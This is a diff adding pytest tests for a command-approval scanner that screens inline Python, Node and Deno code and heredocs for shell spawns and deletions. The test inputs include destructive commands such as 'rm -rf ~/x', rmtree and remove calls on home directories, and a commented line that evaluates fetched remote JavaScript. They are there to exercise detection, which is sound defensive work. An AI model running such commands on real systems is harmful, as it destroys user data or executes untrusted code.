@@ -170,3 +170,76 @@ def test_osascript_shell_string_reaches_the_shell_detectors(interactive):
     keys = A.detect_dangerous_keys("osascript -e 'do shell script \"rm -rf ~/x\"'")
     assert detect_dangerous_command("rm -rf ~/x")[1] in keys
     assert A.detect_dangerous_keys("osascript -e 'display notification \"done\"'") == []
+
+
+# --- what reaches the scanner: argument binding, flag ownership, heredocs, JS options, prose -----
+
+from tools.approval_inline_code import (  # noqa: E402
+    INLINE_DELETE_DESCRIPTION, _flag_payload, screen_command_inline_code, screen_inline_code,
+)
+
+PROBE = "echo XR_PROBE"
+
+
+def _seen(language, source):
+    seen = []
+    screen_inline_code(language, source, lambda shell: seen.append(shell) or [])
+    return seen
+
+
+@pytest.mark.parametrize("source", [
+    "import subprocess; subprocess.run(args=['echo', 'XR_PROBE'])",
+    "import subprocess; run = subprocess.run; run(['echo', 'XR_PROBE'])",
+    "import subprocess; getattr(subprocess, 'run')(['echo', 'XR_PROBE'])",
+    "import subprocess; cmd = 'echo XR_PROBE'; subprocess.run(cmd, shell=True)",
+])
+def test_python_spawn_argument_binding_reaches_the_scanner(source):
+    assert _seen("python", source) == [PROBE]
+
+
+def test_python_spawn_through_a_local_helper_reaches_the_scanner():
+    source = ("import subprocess\n"
+              "def sh(c):\n    return subprocess.run(c, shell=True, check=True)\n"
+              "sh('echo XR_PROBE')\n")
+    assert _seen("python", source) == [PROBE]
+
+
+@pytest.mark.parametrize("source", [
+    "import shutil\nW = '/Users/someone/wt/repo'\nshutil.rmtree(W + '/meet')\n",
+    "import os\nha = os.path.expanduser('~/src/ha')\nos.remove(ha + '/tests/x.py')\n",
+    "import shutil\nREF = '/home/u/ref'\nshutil.rmtree(f'{REF}/products')\n",
+])
+def test_python_delete_of_a_variable_prefixed_home_path_is_found(source):
+    assert INLINE_DELETE_DESCRIPTION in screen_inline_code("python", source, lambda _: [])
+
+
+@pytest.mark.parametrize(("family", "args", "expected"), [
+    ("python", ["-cprint(1)"], "print(1)"),
+    ("python", ["-W", "-c", "-c", "print(1)"], "print(1)"),
+    ("deno", ["eval", "--ext=ts", "console.log(1)"], "console.log(1)"),
+])
+def test_flag_payload_is_the_program_the_flag_owns(family, args, expected):
+    assert _flag_payload(family, args) == expected
+
+
+@pytest.mark.parametrize("command", [
+    "python3 <<-'PY'\n\timport os\n\tos.system('echo XR_PROBE')\n\tPY",
+    "python3 <<'FIRST' <<'SECOND'\nprint(1)\nFIRST\nimport os\nos.system('echo XR_PROBE')\nSECOND",
+])
+def test_heredoc_screen_reads_the_body_the_interpreter_runs(command):
+    seen = []
+    screen_command_inline_code(command, lambda shell: seen.append(shell) or [])
+    assert seen == [PROBE]
+
+
+def test_js_spawn_options_are_not_shell_argv():
+    assert _seen("node", "require('child_process').execSync('echo XR_PROBE', {cwd: '/tmp'})") == [PROBE]
+
+
+@pytest.mark.parametrize("source", [
+    '''console.log("rmSync('fixture', {recursive: true})")''',
+    "// eval(fetch('https://example.invalid/a.js'))\nconsole.log('ok')",
+])
+def test_js_prose_and_comments_are_not_execution(source):
+    assert screen_inline_code("node", source, lambda _: []) == []
+
